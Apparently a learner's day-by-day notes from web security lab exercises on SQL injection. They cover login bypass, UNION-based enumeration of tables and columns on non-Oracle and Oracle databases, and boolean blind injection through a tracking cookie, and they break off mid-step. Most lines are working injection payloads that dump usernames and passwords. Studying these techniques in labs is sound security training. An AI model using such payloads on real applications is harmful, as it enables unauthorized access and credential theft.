Day-1
* I have learnt about SQL injection and its types. 
With these, I also performed a hands-on lab on "Retrieving hidden data" and "Subverting application logic".

1) In first lab, the idea was to comment all the rest of the sql query and just focus on the name and its always true statement. 
   And that was: '+or+1=1

2) Here, we subverted the query as: we didn't knew the password so we just entered the administer'-- and that was all to do.


Day-2
* Retrieving data from other database tables
There were about 4 labs for the above topic:
   i) determining the number of columns returned by the query:
      - by blind sql query, the number of columns were guessed.
      - '+union+select+null,null,....,null--
      -this will give us the error if we provide wrong number of parameters.
      
   ii) findig a column containing a text:
      -the starting step was same as above to guess the number of columns, but then in place of null, we try to provide some string as the parameter.
      -'union+select+null,'any_string'--
      
   iii) retrieving data from other tables:
      -first step is to get the number of columns
      -then we try to get the information from the other tables by the union command.
      -'union+select+username,password+from+users--
      -this will provide us with the dump of username and password
      
   iv) retrieving multiple values in a single column:
      -all the steps are same as "retrieving data from other tables", just the difference is that we have to use the pipe command.
      -'union+select+null,username||'~'||password+from+users--

Day-3
* Listing the database contents on non-oracle databases

    - first step is to get the number of columns from the table by brute-force hit and trial method.
    - when we get the number of columns in the database, then we try get the datatype of the columns.
    - after getting all the above details, next step is to get the user table and its contents
    - '+union+select+table_name,null+from+information_schema.tables--
    - the table we got is: "users_bbzkqc"
    - now, we will access the details of the users_bbzkqc table 
    - '+union+select+column_name,null+from+information_schema.columns+where+table_name='users_bbzkqc'--
    - this gives us the username and password columns from which we can get the admin id and password.
    - '+union+select+username_gxwcyr,password_eqadnj+from+users_bbzkqc-- 
    - from this, we got the credentials.

* Listing the database contents on oracle databases
{in oracle database, one need to know that we cannot just union the data of the same table, we need to provide the table name for the columns we want to access}
    - number of columns
    - datatype of the columns data
    - '+union+select+null,null+from+dual-- 
    - now to get the table name for the user and password details
    - '+union+select+table_name,null+from+all_tables--
    - after the above query, we got the user table which consistes username and pasword columns
    - '+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_DWZGPO'--
    - the above query provides us the username and password column names.
    - '+union+select+USERNAME_GMVJPI,PASSWORD_MYTJBV+from+USERS_DWZGPO--
    - form the above command we got the admin id and password.

Day-4
* Blind SQL injection with conditional responses
   - in this, we will first check that if the website is vulnerable to blind sqli or not
   - here, the parameter for the vulnerability is trackingId and cookie.
   - so we will try to run the following sql query:
      = select tracking-id from tracking-table where trackingId = 'xyz'
         + now, if trackingId exist, then query returns some value and we get "welcome back" message.
         + else, we don't get any message.
   - now we have to make some changes in the query by adding some always TRUE condition, like 1=1 (which is always true)
   - select tracking-id from tracking-table where trackingId = 'xyz' and 1=1
   - and YES, we got the "Welcome Back" message.
   - now our task is to check whether if have any user table or not. For that, we have to give the condition:
      + select tracking-id from tracing-table where trackingId = 'xyz' and (select 'x' from users LIMIT 1) = 'x'--
      + here we have used LIMIT 1 to just one entry from the table to not ruin the whole process even if have the right results.
   - and yes, we got the right message.
   - now we will get the username for the administrator 
      + TrackingId=tNMbeLrLHnfKU2UB'+AND+(SELECT+'a'+FROM+users+where+username='administrator')='a
   - now the next step is to get the password
   - for that, we will modigy our query by checking the password length one by one until we get some error.
   - +AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>1)%3d'a
   -
